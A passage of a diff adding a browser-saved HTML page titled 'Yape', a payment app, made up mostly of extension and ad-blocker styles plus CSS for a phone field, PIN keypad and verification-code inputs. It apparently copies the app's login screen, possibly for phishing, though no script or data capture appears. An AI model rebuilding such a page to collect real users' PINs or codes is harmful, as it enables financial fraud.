@@ -1,0 +1,1964 @@
+<html lang="en" data-darkreader-mode="dynamic" data-darkreader-scheme="dark"><plasmo-csui
+    id="merlinExt-selectContextBtn"></plasmo-csui><merlin-component id="merlin-text-summarizer"
+    class="merlin text-summarizer"></merlin-component><plasmo-csui id="merlinExt-merlinGUI"></plasmo-csui>
+
+<head>
+    <style class="darkreader darkreader--fallback" media="screen"></style>
+    <style class="darkreader darkreader--text" media="screen"></style>
+    <style class="darkreader darkreader--invert" media="screen">
+        .jfk-bubble.gtx-bubble,
+        .captcheck_answer_label>input+img,
+        span#closed_text>img[src^="https://www.gstatic.com/images/branding/googlelogo"],
+        span[data-href^="https://www.hcaptcha.com/"]>#icon,
+        #bit-notification-bar-iframe,
+        ::-webkit-calendar-picker-indicator {
+            filter: invert(100%) hue-rotate(180deg) contrast(90%) !important;
+        }
+    </style>
+    <style class="darkreader darkreader--inline" media="screen">
+        [data-darkreader-inline-bgcolor] {
+            background-color: var(--darkreader-inline-bgcolor) !important;
+        }
+
+        [data-darkreader-inline-bgimage] {
+            background-image: var(--darkreader-inline-bgimage) !important;
+        }
+
+        [data-darkreader-inline-border] {
+            border-color: var(--darkreader-inline-border) !important;
+        }
+
+        [data-darkreader-inline-border-bottom] {
+            border-bottom-color: var(--darkreader-inline-border-bottom) !important;
+        }
+
+        [data-darkreader-inline-border-left] {
+            border-left-color: var(--darkreader-inline-border-left) !important;
+        }
+
+        [data-darkreader-inline-border-right] {
+            border-right-color: var(--darkreader-inline-border-right) !important;
+        }
+
+        [data-darkreader-inline-border-top] {
+            border-top-color: var(--darkreader-inline-border-top) !important;
+        }
+
+        [data-darkreader-inline-boxshadow] {
+            box-shadow: var(--darkreader-inline-boxshadow) !important;
+        }
+
+        [data-darkreader-inline-color] {
+            color: var(--darkreader-inline-color) !important;
+        }
+
+        [data-darkreader-inline-fill] {
+            fill: var(--darkreader-inline-fill) !important;
+        }
+
+        [data-darkreader-inline-stroke] {
+            stroke: var(--darkreader-inline-stroke) !important;
+        }
+
+        [data-darkreader-inline-outline] {
+            outline-color: var(--darkreader-inline-outline) !important;
+        }
+
+        [data-darkreader-inline-stopcolor] {
+            stop-color: var(--darkreader-inline-stopcolor) !important;
+        }
+    </style>
+    <style class="darkreader darkreader--variables" media="screen">
+        :root {
+            --darkreader-neutral-background: #131516;
+            --darkreader-neutral-text: #d8d4cf;
+            --darkreader-selection-background: #004daa;
+            --darkreader-selection-text: #e8e6e3;
+        }
+    </style>
+    <style class="darkreader darkreader--root-vars" media="screen"></style>
+    <style class="darkreader darkreader--user-agent" media="screen">
+        html {
+            background-color: #181a1b !important;
+        }
+
+        html {
+            color-scheme: dark !important;
+        }
+
+        html,
+        body {
+            background-color: #181a1b;
+        }
+
+        html,
+        body {
+            border-color: #736b5e;
+            color: #e8e6e3;
+        }
+
+        a {
+            color: #3391ff;
+        }
+
+        table {
+            border-color: #545b5e;
+        }
+
+        ::placeholder {
+            color: #b2aba1;
+        }
+
+        input:-webkit-autofill,
+        textarea:-webkit-autofill,
+        select:-webkit-autofill {
+            background-color: #404400 !important;
+            color: #e8e6e3 !important;
+        }
+
+        ::-webkit-scrollbar {
+            background-color: #202324;
+            color: #aba499;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background-color: #454a4d;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background-color: #575e62;
+        }
+
+        ::-webkit-scrollbar-thumb:active {
+            background-color: #484e51;
+        }
+
+        ::-webkit-scrollbar-corner {
+            background-color: #181a1b;
+        }
+
+        ::selection {
+            background-color: #004daa !important;
+            color: #e8e6e3 !important;
+        }
+
+        ::-moz-selection {
+            background-color: #004daa !important;
+            color: #e8e6e3 !important;
+        }
+    </style>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="/img/logo.png" type="image/x-icon">
+    <link rel="stylesheet" href="css/style.css">
+    <style class="darkreader darkreader--cors" media="screen">
+        * {
+            padding: 0;
+            margin: 0;
+            -webkit-box-sizing: border-box;
+            box-sizing: border-box;
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background-color: #5f0b72;
+            color: #fff;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .form-centent {
+            text-align: center;
+        }
+
+        .form-centent .title {
+            font-size: 1rem;
+            padding: 2.5rem 1rem 1rem;
+            line-height: 1.7;
+            font-weight: 500;
+        }
+
+        .form-centent .title span {
+            font-size: 20px;
+        }
+
+        .form-centent .input-field {
+            text-align: left;
+            height: 60px;
+            position: relative;
+        }
+
+        .form-centent .input-field label {
+            color: #fff;
+            font-size: 14px;
+            font-weight: 300;
+            -webkit-transition: .2s ease;
+            transition: .2s ease;
+            position: absolute;
+            left: 0;
+            top: 70%;
+            -webkit-transform: translateY(-50%);
+            transform: translateY(-98%);
+        }
+
+        .form-centent .input-field input {
+            height: 70%;
+            width: 100%;
+            border: 0;
+            outline: 0;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 400;
+            background-color: transparent;
+        }
+
+        .form-centent .input-field .bar {
+            width: 100%;
+            height: 1px;
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            background-color: #757575;
+            -webkit-transition: .2s ease;
+            transition: .2s ease;
+        }
+
+        .form-centent .input-field .line {
+            width: 0%;
+            height: 100%;
+            -webkit-transition: .2s ease;
+            transition: .2s ease;
+        }
+
+        .form-centent .focused label {
+            top: -5px;
+            -webkit-transform: translateY(0%);
+            transform: translateY(0%);
+            color: #757575;
+            font-size: 10px;
+        }
+
+        .form-centent .focused .line {
+            width: 100%;
+            background-color: #10cbb4;
+            border-bottom: 2px solid #10cbb4;
+        }
+
+        .form-centent .dots-b {
+            text-align: center;
+            font-size: 17px;
+            margin-top: 28px;
+        }
+
+        .form-centent .dots {
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            gap: 30px;
+            margin-top: 20px;
+            height: 1px;
+        }
+
+        .form-centent .dots .dot {
+            width: 10px;
+            height: 9.5px;
+            border-radius: 50%;
+            background-color: #8b3e99;
+            -webkit-transition: .1s ease;
+            transition: .1s ease;
+        }
+
+        .form-centent .dots .active {
+            background-color: #14c9b3;
+            width: 15px;
+            height: 13.8px;
+        }
+
+        .form-centent .btns {
+            display: -ms-grid;
+            display: grid;
+            -ms-grid-columns: (1fr)[3];
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-top: 3rem;
+        }
+
+        .form-centent .btns .btn {
+            text-align: center;
+            border-radius: 6px;
+            font-size: 26px;
+            height: 46px;
+            line-height: 46px;
+            background-color: #8c3c99;
+            cursor: pointer;
+        }
+
+        .form-centent .btns .btn:empty {
+            background-color: transparent;
+        }
+
+        .form-centent .btns .btn:empty:active {
+            background-color: transparent;
+        }
+
+        .form-centent .btns .btn:active {
+            background-color: #bec9d5;
+        }
+
+        .form-centent .btns .btn img {
+            height: 20px;
+        }
+
+        .form-centent .btns .btn[type="delete"] {
+            background-color: transparent;
+        }
+
+        .entery {
+            width: 1000px;
+            margin: 0 auto;
+            padding: 0 40px;
+        }
+
+        .validation-content {
+            width: 700px;
+            margin: 0 auto;
+        }
+
+        .validation {
+            padding: 0 20px;
+        }
+
+        .validation .validation-content {
+            background-color: #fff;
+            padding: 16px 16px 40px;
+            color: #000;
+            text-align: center;
+            line-height: 1.8rem;
+            font-size: 15px;
+        }
+
+        .validation .tt {
+            font-size: 20px;
+            font-weight: 500;
+            color: #6f1667;
+        }
+
+        .validation a {
+            color: #09ccb6;
+            text-decoration: none;
+        }
+
+        .validation .inputs {
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center;
+            gap: 8px;
+            margin: 7px 0 10px;
+        }
+
+        .validation .inputs input {
+            font-size: 24px;
+            text-align: center;
+            width: 40px;
+            height: 40px;
+            border-radius: 4px;
+            border: solid 1px #c5c5c5;
+        }
+
+        input[type="number"] {
+            -moz-appearance: textfield;
+        }
+
+        input[type="number"]::-webkit-inner-spin-button,
+        input[type="number"]::-webkit-outer-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        .error {
+            color: #842029;
+            background-color: #f8d7da;
+            padding: 1rem;
+            margin: 0 auto 1rem;
+            font-size: 11px;
+            text-align: center;
+            border-radius: 0;
+        }
+
+        .d-none {
+            display: none;
+        }
+
+        @media only screen and (max-width: 946px) {
+            .entery {
+                width: 100%;
+            }
+        }
+
+        @media only screen and (max-width: 768px) {
+            .validation-content {
+                width: 100%;
+            }
+        }
+    </style>
+    <style class="darkreader darkreader--sync" media="screen"></style>
+    <title>Yape</title>
+    <style type="text/css" id="operaUserStyle"></style>
+    <style class="darkreader darkreader--sync" media="screen"></style>
+    <meta name="darkreader" content="90f85578b402428e93475ce67c5d3576">
+    <style class="darkreader darkreader--override" media="screen">
+        .vimvixen-hint {
+            background-color: #7b5300 !important;
+            border-color: #d8b013 !important;
+            color: #f3e8c8 !important;
+        }
+
+        ::placeholder {
+            opacity: 0.5 !important;
+        }
+
+        #edge-translate-panel-body,
+        .MuiTypography-body1,
+        .nfe-quote-text {
+            color: var(--darkreader-neutral-text) !important;
+        }
+
+        gr-main-header {
+            background-color: #0f3a48 !important;
+        }
+
+        .tou-z65h9k,
+        .tou-mignzq,
+        .tou-1b6i2ox,
+        .tou-lnqlqk {
+            background-color: var(--darkreader-neutral-background) !important;
+        }
+
+        .tou-75mvi {
+            background-color: #032029 !important;
+        }
+
+        .tou-ta9e87,
+        .tou-1w3fhi0,
+        .tou-1b8t2us,
+        .tou-py7lfi,
+        .tou-1lpmd9d,
+        .tou-1frrtv8,
+        .tou-17ezmgn {
+            background-color: #0a0a0a !important;
+        }
+
+        .tou-uknfeu {
+            background-color: #231603 !important;
+        }
+
+        .tou-6i3zyv {
+            background-color: #19576c !important;
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+
+        embed[type="application/pdf"][src="about:blank"] {
+            filter: invert(100%) contrast(90%);
+        }
+    </style>
+    <style id="custom-cursor" type="text/css">
+        body button,
+        body [type='button'],
+        body input[type='reset'],
+        body input[type='submit'],
+        body [role="button"],
+        ::-webkit-search-cancel-button,
+        ::-webkit-search-decoration,
+        ::-webkit-scrollbar-button,
+        ::-webkit-file-upload-button,
+        [role^=button],
+        .cc_pointer,
+        [type="search"]::-webkit-search-cancel-button,
+        a,
+        select,
+        [type="search"]::-webkit-search-decoration,
+        .paper-button,
+        .ytp-progress-bar-container,
+        input[type=submit],
+        :link,
+        :visited,
+        a>*,
+        img,
+        ::-webkit-scrollbar-button,
+        .ogdlpmhglpejoiomcodnpjnfgcpmgale_pointer,
+        ::-webkit-file-upload-button,
+        .ytp-volume-panel,
+        #myogdlpmhglpejoiomcodnpjnfgcpmgale .icon,
+        body .custom-cursor-on-hover {
+            cursor: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAABW9JREFUWEe1l3tQVHUUxz/LAgO6MCBgOIiaoqJBKWSRUo6TM2SDzVI4YVoSajoVyVTjpNMDS83qj8qGBl+Jgo+JRlJASXysLxzTpBRYBQR5IyKkuzwWcG/zu7DLsoC7Pvr9c+fe3/ec87nnnN/9/a6C/iMfmAJ0Aa49V2tVG+DS8zASyB7Aj12PFFaqU46OjuFtbW2o1Wqys2W/1ppmX19fj7q6OjZt2c7yd+IG0tgVfCBDSQR3cel+OYVCjj0JuGLhUZIkSb69kF/ArJnT0et0G4BVdke1EFq+nQfQbHKelZXF3LlzB/Rp0hRqS9jw9TrSUndcBx5/WIBlQLLJuT3OKqpqOXZcQ9yiBQ9cBssMZERERKhzcnLk2O3t7dTX1zNmzJhBWRpvNXO9soZpIcGPBMCyswcMqtVqCQwMNM/p9C1cLSl/JAC5wOzwqPnEfPIlbs6ODHFS0tBioLvdYH/Sd+Tu3Ex6ejrR0dHyM0NHB5cLix8a4HVgb8pfpbz51Nh+b36i4iZFjXfk57vXrSbvQDqmPrEC8Aeq7ekdS43oAWnhZ9+gjnmDqIl+5jlD111uG7rYd6VazkJNyRX+0Rzm4Naf0Ol0qFQq6wzMAjQPBJCQvIuAqc/c0/bglo3yvAAoLy+Xm9MqA9b2nwLrbAHJGXh5Sbyscxmqwm/CJLz9/HEZoqK9VU99WSkVRZfMfgSAqQSmJpwRFkrkqmd5LfF5WXejtIkPxyfbtTJkgCemz2T05CdtwVKpvUzBGY0ZwLQMX4mM4Lml48wAwtECxXpxWQ5supdjATBT1C48KgZ3L59BtbfqqjmXncHZs2cJCwuTdZVVtTQ0NrF8aRxDgwwsSxH7UvdYOysNraZyLzDfFoCYN602VJ7D8PB+zGwjArfpdfJ9ZmYmkZG9QQqKSmg3GGQAp4l64ndFme1SE3LJ+fG82EPEXjLoMH0JpdTUVAICAkhLS6OwsNBsEBoaSmxsLEFBQf2c/Jy8lT27Uzl94SJBLw5jTmIIrq4u+Pr5cOT7v9m35pRYlmJ52gZQHG0G/W2k4/tAex7qq6C+sttQqQQfP/D1B/8JKILCIDgMSrXytJSyFv+OP4nZFG4OVJBZyaE1F8W99XbeB8acARngfkZbK9RUmAHc7/zBpERxfukeNzWdlCUZ/keAsmIw3h0UoD6nk4ptBj3gZn8J7M2AZIRrV81qUQLrDFT/2kFNeofNc0JvCY40iSOQfQg9tTeJpS2f4952vE8JriW106jpEp9m8Ym23YSO0xPpuvYLrExCMaW3mfpYtuqhtgpJNOnJ31GUVaEMjsNYfQrVkMN9AApXt6IvMW4FltoF4PTSdhSe47trqqvGWJuH1FzSbatQonAfjcIrEIfhU/v569R8hNuwC30Azs0T5WcJsM0egCqHifNGOoassK8EVqrOo/G4+VwaCMAT+NcegBUolD84x5x4JADlmw005HbaXILWAsl5/mkZwHgjn65j8SjcRoGrV3dZGvJRPv0xyvHq/iU48i7Szd4ds0cgNpZGW29k2fZmAJORsSaPrpMrxW0KMFLhNmq2U+Tu/gAHopFa6hOBNbYCWs/3AZgxLYS8oloYOgLuduBprKGpWS6h0H2Bq0+iszqjX4yOPfKqiQV2PBRA6sZvmTC29xielLKLnb/tNwOMGO6TKDQXLxeha2nBy9ODkODJvPDqQqF54COZCVpaFLuY9z9I4FZjI17e3iyIiaa4+Kr4UZgDLFM6OCS/NU9N+LQQvDw9qaqr49iZc2QcEofqe286g2XGsgTjgNIBhE49f8gqQPdefAKxby+WZQaDgQ3rvyIr05yl+63AfVOHin9SqyiiScQXzGbHD0T3H4d6KT9o9oRwAAAAAElFTkSuQmCC") 5 0, pointer !important;
+        }
+
+        html,
+        body,
+        body select,
+        body .custom-cursor-default-hover {
+            cursor: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAA7JJREFUWEftln1M1GUcwD/c8WY74CqTCP84OcSXYFJXuEHW6P5oBZuu7EWjBZJlmXou13rRqzVztprrzaUrtZRRc9nWZKEbJY7NgkI0aFqcCA5FBeKUk+PkXtr3OY8OumJ3B/SP3z/unt/z+z3f7+f5vj1PDH7pA/TARmDDtblJ+YsBnLMyDImVH23CVLRUjMrcpIkY87lPNyqDxgXFdHR2OYCkySJQALa6/Rim36Zsxs4wyV8tUDgZEAKwK1arLR20NSh7brebxJnzZfgxsGqiIQLx9q0uW8IW6zplz3FlAH32Ahm+D6ydSIgAwFSgu3bvZ9xz9x2jIb4GHp0oiOCMLwKq2o98x/S0VGVv0OVCNztfhscAP9k4y+iSWyNu72w4yK23iFP8ci0xJ6Q6QtW8gmip2cdso0EB2LsvMqPwEfqvDMhjnOTqeDni35qOgvjp291kZxo4d9qm7JVbt1B3tEWG8iNl2hMtyH91vf1A8QMFd1Hz41E8Xq+yZS7IIyU5iW+qvx8Xb4QCGJKwi/bXXixn6aKHhkMRvFvzE89yuL5RQiEhiVhGA+QCTYHWHKz1zwtd2HsuclNqGvqp04KT8xlgR6QEAiC7lV2rfEtJ1ul7jx9WD65BJ91nz5CekUVMjJ+1395Hkv5GNa5vaqbg4VIZRnyAycKngc8dJ4+ompcYH6z4BK/Xg0ajHXNjqXea6e2zS1LmjPlxiA+GW/Fgaz1f7Knk7CUnVstztJ9owTAnWy3x+Xy4h64SF5/wDxVej4f4zDyZTwPOhwsRAGgy5czJfc9SxqFfbQrA6ehnii6JjjYbRvPj/FG1k4zb54XUX/LCS3xVLQdo+KEYcRbUV37A1n01fLh+DZpYLTfoklUX3LiqFPtlB+vXPo8uRS5OI6Xtt+NkFS+TyRXA9nC8EJw8PtmlKLpvvolPN6xUxhyX7EqfzIfygniqq6ONYydP8di6t8P2QjBAK5C52bKMwrx5FK30Xw1fX76EL6traWj+HeuKJykpNpNuzCIhcYoKkxgXOdF2hoWr34wKQBbLdeiX9Gk3c2jnu0pxc2s7OTP9Z0L+UxY2W8q51zQy4d0eD3MXLo86BMGhc2o1mkTXqZ/V3NBVF73nzzHQfxnr1t3UNTZzYNsmEuLj6LzQw/3lL8tnB4AHw4n/WO4abskBpbOMBl4tW0x+7lze2lZBRdUPgVevAO+Ea3wsgNH6MoE3gJKgF1FfVCJtoVKL/vKIUiIFiNLs38uvA1z3wP/ugb8AvZEjMNq6SEUAAAAASUVORK5CYII=") 2 0, auto !important;
+        }
+    </style>
+    <style class="darkreader darkreader--sync" media="screen"></style>
+    <style>
+        undefined
+    </style>
+    <style class="darkreader darkreader--sync" media="screen"></style>
+    <style type="text/css">
+        :root zeus-ad,
+        :root topadblock,
+        :root span[id^="ezoic-pub-ad-placeholder-"],
+        :root guj-ad,
+        :root gpt-ad,
+        :root div[jsdata*="CarouselPLA-"][data-id^="CarouselPLA-"],
+        :root div[id^="zergnet-widget"],
+        :root div[id^="yandex_ad"],
+        :root div[id^="vuukle-ad-"],
+        :root div[id^="sticky_ad_"],
+        :root div[id^="rc-widget-"],
+        :root div[id^="lazyad-"],
+        :root div[id^="gpt_ad_"],
+        :root div[id^="ezoic-pub-ad-"],
+        :root div[id^="div-gpt-"],
+        :root div[id^="dfp-ad-"],
+        :root div[id^="advads_ad_"],
+        :root div[id^="adspot-"],
+        :root div[id^="ads300_250-widget-"],
+        :root div[id^="ads300_100-widget-"],
+        :root div[id^="ads250_250-widget-"],
+        :root div[id^="adrotate_widgets-"],
+        :root div[id^="adngin-"],
+        :root div[id^="_vdo_ads_player_ai_"],
+        :root div[id*="ScriptRoot"],
+        :root div[id*="MarketGid"],
+        :root div[data-native_ad],
+        :root div[data-mpu1],
+        :root div[data-insertion],
+        :root div[data-id-advertdfpconf],
+        :root div[data-google-query-id],
+        :root hl-adsense,
+        :root div[data-contentexchange-widget],
+        :root div[data-content="Advertisement"],
+        :root div[data-alias="300x250 Ad 2"],
+        :root div[data-alias="300x250 Ad 1"],
+        :root div[data-adzone],
+        :root div[data-adunit-path],
+        :root div[data-ad-wrapper],
+        :root div[data-ad-targeting],
+        :root div[data-ad-placeholder],
+        :root div[class^="native-ad-"],
+        :root div[data-dfp-id],
+        :root div[class^="kiwi-ad-wrapper"],
+        :root div[class^="Adstyled__AdWrapper-"],
+        :root div[aria-label="Ads"],
+        :root display-ads,
+        :root display-ad-component,
+        :root aside[id^="adrotate_widgets-"],
+        :root article.ad,
+        :root ark-top-ad,
+        :root app-advertisement,
+        :root app-ad,
+        :root amp-fx-flying-carpet,
+        :root amp-embed[type="taboola"],
+        :root amp-connatix-player,
+        :root amp-ad-custom,
+        :root ad-shield-ads,
+        :root ad-desktop-sidebar,
+        :root a[onmousedown^="this.href='https://paid.outbrain.com/network/redir?"][target="_blank"]+.ob_source,
+        :root a[onmousedown^="this.href='https://paid.outbrain.com/network/redir?"][target="_blank"],
+        :root a[onmousedown^="this.href='http://paid.outbrain.com/network/redir?"][target="_blank"]+.ob_source,
+        :root a[href^="https://yogacomplyfuel.com/"],
+        :root a[href^="https://www.purevpn.com/"][href*="&utm_source=aff-"],
+        :root a[href^="https://www.privateinternetaccess.com/"]>img,
+        :root a[href^="https://www.onlineusershielder.com/"],
+        :root a[href^="https://www.nutaku.net/signup/landing/"],
+        :root a[href^="https://www.nudeidols.com/cams/"],
+        :root a[href^="https://www.mypornstarcams.com/landing/click/"],
+        :root a[href^="https://www.kingsoffetish.com/tour?partner_id="],
+        :root a[href^="https://www.infowarsstore.com/"]>img,
+        :root a[href^="https://t.grtyi.com/"],
+        :root a[href^="https://www.highperformancecpmgate.com/"],
+        :root a[href^="https://www.highcpmrevenuenetwork.com/"],
+        :root a[href^="https://www.get-express-vpn.com/offer/"],
+        :root a[href^="https://www.financeads.net/tc.php?"],
+        :root a[href^="https://www.brazzersnetwork.com/landing/"],
+        :root div[class^="Display_displayAd"],
+        :root a[href^="https://www.sheetmusicplus.com/?aff_id="],
+        :root a[href^="https://www.bang.com/?aff="],
+        :root [data-template-type="nativead"],
+        :root a[href^="https://www.adultempire.com/"][href*="?partner_id="],
+        :root a[href^="https://webroutetrk.com/"],
+        :root a[href^="https://wantopticalfreelance.com/"],
+        :root a[href^="https://twinrdsyn.com/"],
+        :root a[href^="https://tsartech.g2afse.com/"],
+        :root [href^="https://www.mypatriotsupply.com/"]>img,
+        :root a[href^="https://trk.softonixs.xyz/"],
+        :root a[href^="https://trk.nfl-online-streams.club/"],
+        :root a[href^="https://tragency-clesburg.icu/"],
+        :root a[href^="https://tracking.avapartner.com/"],
+        :root a[href^="https://track.afcpatrk.com/"],
+        :root a[href^="https://track.adform.net/"],
+        :root a[href^="https://torguard.net/aff.php"]>img,
+        :root [data-role="tile-ads-module"],
+        :root a[href^="https://adsrv4k.com/"],
+        :root a[href^="https://go.xlviirdr.com"],
+        :root a[href^="https://thaudray.com/"],
+        :root a[href^="https://www.5mno3.com/"],
+        :root a[href^="https://taghaugh.com/"],
+        :root a[href^="https://www.sweetdeals.com"],
+        :root [href^="https://zstacklife.com/"] img,
